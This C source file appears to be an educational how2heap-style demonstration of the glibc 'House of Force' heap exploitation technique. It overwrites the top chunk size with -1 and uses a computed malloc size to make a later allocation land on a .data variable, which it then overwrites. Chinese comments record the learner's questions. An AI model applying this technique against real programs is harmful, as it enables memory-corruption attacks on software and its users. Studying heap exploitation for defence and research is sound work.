#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

//这个案例的主要思想并没有完全搞懂，通过指针把top chunk 的size的值改成最大值。再设置好下一次分配的内存大小，使得之后的内存分配从数据段变量bss_var处开始分配。
//主要的一点是当top chunk在0x555555757360，且大小是 -1 的时候，malloc一个大小为0xffffffffffffeca0的块后，heap 的起始地址变成了.data段的起始地址 0x555555756000，
//大小也变成了 0x555555756008,这样再次分配地址后确实能拿到.data的地址空间


//疑问：
//将.data段当作堆内存分配出去后就有了堆的读写权限？

//改变top chunk的size后，分配一个在非常大的数时候，超过了堆的大小堆是怎么分配的。
//evil_size为 0xffffffffffffeca0 = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top
//这样是相当于反向分配了内存到 bss_var的位置吗
char bss_var[] = "This is a string that we want to overwrite.";

int main(int argc , char* argv[])
{

	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
	intptr_t *p1 = malloc(256);
	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - 2);

	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
	int real_size = malloc_usable_size(p1);//计算真实分配的空间大小
	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);

	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");

	//----- VULNERABILITY ----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);

	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;//修改了top chunk的大小
	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	//------------------------

	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
	void *new_ptr = malloc(evil_size);
	//分配完evil_size后，堆变成了这样，从vmmap来看，0x555555756000是 .data段的地址
	//gdb-peda$ heap
	//Addr: 0x555555756000
	//Size: 0x555555756008

	
	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);

	void* ctr_chunk = malloc(100);
	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
	fprintf(stderr, "Now, we can finally overwrite that value:\n");

	fprintf(stderr, "... old string: %s\n", bss_var);
	fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
	strcpy(ctr_chunk, "YEAH!!!");
	fprintf(stderr, "... new string: %s\n", bss_var);

	assert(ctr_chunk == bss_var);


	
}
